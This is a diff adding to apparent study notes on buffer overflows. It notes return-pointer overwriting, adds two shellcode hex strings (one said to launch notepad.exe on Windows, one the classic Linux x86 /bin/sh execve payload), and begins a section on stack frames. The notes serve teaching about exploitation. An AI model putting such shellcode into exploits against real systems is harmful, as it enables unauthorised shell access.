@@ -111,3 +111,20 @@ void DoHexDump(FILE*file) {
 - Strategy: change the return pointer such that it points to other user-supplied data on the stack
 - Could be a shellcode/opcode entered by an attacker
 - Could be loaded function already in stack
+
+## Shell Code Examples
+```
+68 78 fb 11 00 FF 15 30 20 40 00
+```
+- Launches `notepad.exe` in Windows using an already loaded library called `Msvcr70.System`
+
+```
+eb 2a 5e 89 76 08 c6 46 07 00 c7 46 0c 00 00 00 00 b8 0b 00 00 00 89 f3 8d 4e 08 8d 56 0c cd 80 b8 01 00 00 00 bb 00 00 00 00 cd 80 e8 d1 ff ff ff 2f 62 69 6e 2f 73 68 00 89 ec 5d c3
+```
+- Launches a shell in Linux on Intel
+
+## Stack Frames
+- When a function is called, some data is pushed to the stack
+- This data is called a **stack frame**
+	- Function arguments (pushed in reverse order)
+	- Return address 
